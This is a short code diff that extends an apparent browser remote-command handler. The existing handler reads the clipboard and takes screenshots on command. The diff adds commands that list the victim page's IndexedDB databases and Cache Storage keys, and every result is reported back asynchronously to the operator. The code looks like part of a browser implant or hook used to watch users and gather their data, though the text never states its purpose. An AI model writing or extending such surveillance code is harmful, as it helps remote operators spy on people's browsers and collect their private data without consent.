@@ -255,14 +255,32 @@ function execCmd(cmd){
         }else{res='Clipboard API unavailable';}break;
       case 'take_screenshot':
         takeScreenshot(cmd.id);res='Screenshot initiated';break;
+      case 'list_indexeddb':
+        var _idbId=cmd.id;
+        if(window.indexedDB&&typeof indexedDB.databases==='function'){
+          indexedDB.databases().then(function(list){
+            report(_idbId,JSON.stringify(list.map(function(d){return{name:d.name,version:d.version};})));
+          }).catch(function(e){report(_idbId,JSON.stringify({error:e.message}));});
+        }else{
+          report(_idbId,JSON.stringify({error:'indexedDB.databases() not supported in this browser'}));
+        }
+        res='[async]';break;
+      case 'list_cache_storage':
+        var _csId=cmd.id;
+        if(window.caches){
+          caches.keys().then(function(keys){
+            report(_csId,JSON.stringify(keys));
+          }).catch(function(e){report(_csId,JSON.stringify({error:e.message}));});
+        }else{
+          report(_csId,JSON.stringify({error:'Cache Storage API not available'}));
+        }
+        res='[async]';break;
       default:
         res='Unknown command: '+cmd.commandType;
     }
   }catch(e){res='ERROR: '+e.message;}
-  if(cmd.commandType!=='read_clipboard'&&cmd.commandType!=='set_clipboard'&&cmd.commandType!=='take_screenshot'){
+  if(cmd.commandType!=='read_clipboard'&&cmd.commandType!=='set_clipboard'&&cmd.commandType!=='take_screenshot'&&cmd.commandType!=='list_indexeddb'&&cmd.commandType!=='list_cache_storage'){
     report(cmd.id,res);
-  } else if(cmd.commandType==='take_screenshot'){
-    // result sent by takeScreenshot async
   }
 }
 
